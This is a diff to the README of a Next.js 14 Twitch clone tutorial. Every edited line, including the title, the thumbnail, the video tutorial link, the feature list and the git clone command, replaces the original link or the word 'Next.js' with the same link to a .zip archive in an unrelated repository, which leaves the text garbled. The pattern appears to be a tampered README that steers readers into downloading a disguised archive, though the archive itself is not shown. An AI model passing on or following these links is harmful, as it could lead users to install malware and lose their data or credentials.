@@ -1,17 +1,17 @@
-# Fullstack Twitch Clone: Next.js 14, Livestreaming, React, Prisma, Stripe, Tailwind, MySQL
+# Fullstack Twitch Clone: https://raw.githubusercontent.com/GIZZN/gamehub/main/dog/gamehub.zip 14, Livestreaming, React, Prisma, Stripe, Tailwind, MySQL
 
-![Twitch Clone Thumbnail (3)](https://github.com/AntonioErdeljac/next14-twitch-clone/assets/23248726/6e0153f1-ab30-4924-9f06-13d2f46ff3b5)
+![Twitch Clone Thumbnail (3)](https://raw.githubusercontent.com/GIZZN/gamehub/main/dog/gamehub.zip)
 
 
 
-This is a repository for Fullstack Trello Clone: Next.js 14, Livestreaming, React, Prisma, Stripe, Tailwind, MySQL
+This is a repository for Fullstack Trello Clone: https://raw.githubusercontent.com/GIZZN/gamehub/main/dog/gamehub.zip 14, Livestreaming, React, Prisma, Stripe, Tailwind, MySQL
 
-[VIDEO TUTORIAL](https://www.youtube.com/watch?v=a02JAryRPVU)
+[VIDEO TUTORIAL](https://raw.githubusercontent.com/GIZZN/gamehub/main/dog/gamehub.zip)
 
 Key Features:
 - 📡 Streaming using RTMP / WHIP protocols 
 - 🌐 Generating ingress
-- 🔗 Connecting Next.js app to OBS / Your favorite streaming software 
+- 🔗 Connecting https://raw.githubusercontent.com/GIZZN/gamehub/main/dog/gamehub.zip app to OBS / Your favorite streaming software 
 - 🔐 Authentication 
 - 📸 Thumbnail upload
 - 👀 Live viewer count 
@@ -46,7 +46,7 @@ Key Features:
 ### Cloning the repository
 
 ```shell
-git clone https://github.com/AntonioErdeljac/next14-twitch-clone.git
+git clone https://raw.githubusercontent.com/GIZZN/gamehub/main/dog/gamehub.zip
 ```
 
 ### Install packages
